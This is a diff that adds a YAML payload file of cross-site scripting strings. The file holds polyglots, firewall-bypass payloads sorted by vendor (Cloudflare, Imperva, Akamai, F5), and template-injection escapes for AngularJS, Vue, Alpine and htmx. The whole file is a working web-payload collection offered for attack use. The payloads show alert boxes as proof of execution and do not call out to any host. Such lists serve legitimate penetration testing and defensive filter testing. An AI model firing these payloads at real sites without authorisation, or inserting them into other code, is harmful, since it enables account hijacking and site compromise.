@@ -1,0 +1,39 @@
+# payloads/xss.yml
+# Expert-Level XSS polyglots, WAF bypasses, and modern JS framework escapes
+
+polyglots:
+  - "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */onerror=alert(1) )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert(1)//>\\x3e"
+  - "\"><details/open/ontoggle=confirm('XSS')>"
+  - "'\">><script>/*<svg/onload=alert(1)>*/</script>"
+  - "\"-prompt(1)-\"\\\"-prompt(1)-\\\""
+  - "javascript://%250Aalert(1)//\""
+
+waf_bypass:
+  cloudflare:
+    - "<svg/onload=confirm(1)>"
+    - "<svg onload=alert%281%29>"
+    - "<img/src=x onerror=alert`1`>"
+    - "<body onfocus=alert(1) autofocus>"
+    - "<a href=\"javascript:void(0)\" onmouseover=&NewLine;javascript:alert(1)&NewLine;>X</a>"
+  imperva:
+    - "<iframe/src=\"javascript:alert(1)\">"
+    - "<body/onload=alert(1)>"
+    - "<a href=\"j&Tab;a&Tab;v&Tab;asc&Tab;ri&Tab;pt:alert&lpar;1&rpar;\">X</a>"
+  akamai:
+    - "<object data=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\">"
+    - "<math><maction actiontype=statusline xlink:href=javascript:alert(1)>Click</math>"
+  f5:
+    - "<svg/onload=setTimeout('al'+'ert(1)')>"
+
+framework_escapes:
+  angularjs:
+    - "{{constructor.constructor('alert(1)')()}}"
+    - "{{$on.constructor('alert(1)')()}}"
+    - "{{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1)//');}}"
+  vuejs:
+    - "{{_setupProxy.alert(1)}}"
+    - "{{constructor.constructor('alert(1)')()}}"
+  alpinejs:
+    - "<div x-data x-on:error.window=\"alert(1)\"></div>"
+  htmx:
+    - "<img src=x hx-on:error=\"alert(1)\">"
